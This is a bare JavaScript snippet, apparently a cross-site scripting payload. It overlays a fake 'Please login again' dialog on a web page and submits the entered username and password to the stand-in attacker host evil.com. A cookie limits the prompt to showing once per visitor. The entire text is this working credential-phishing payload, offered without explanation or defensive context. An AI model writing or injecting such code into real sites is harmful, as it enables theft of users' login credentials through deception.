var html = `
<div id=\"bg\" style=\"position: absolute; z-index: 100; width: 100%; height: 100%; background-color: #000000; opacity: 0.5; top: 0; left: 0; margin: 0\">
</div>
<div id=\"form\" style=\"position: absolute; z-index: 150; font-family: Arial; background-color: #ffffff; width: 280px; height: 185px; top: 50%; left: 40%; padding: 10px\">
<p>An error occurred. Please login again.</p>
  <form method=\"POST\" action=\"http://evil.com/getdata.php\">
    <p>Username <input type=\"text\" name=\"username\"></p>
    <p>Password <input type=\"password\" name=\"password\"></p>
    <p><input type=\"submit\" value=\"Login\"></p>
  </form>
</div> `;

var expire = new Date();
expire.setFullYear(expire.getFullYear() + 1);
var cookie = "runonce=true; path=/; expires=" + expire.toUTCString();
var div = document.createElement("div");
if (document.cookie.indexOf("runonce=") < 0) {
    div.innerHTML = html;
    document.getElementsByTagName("body")[0].appendChild(div);
    document.cookie = cookie;
}
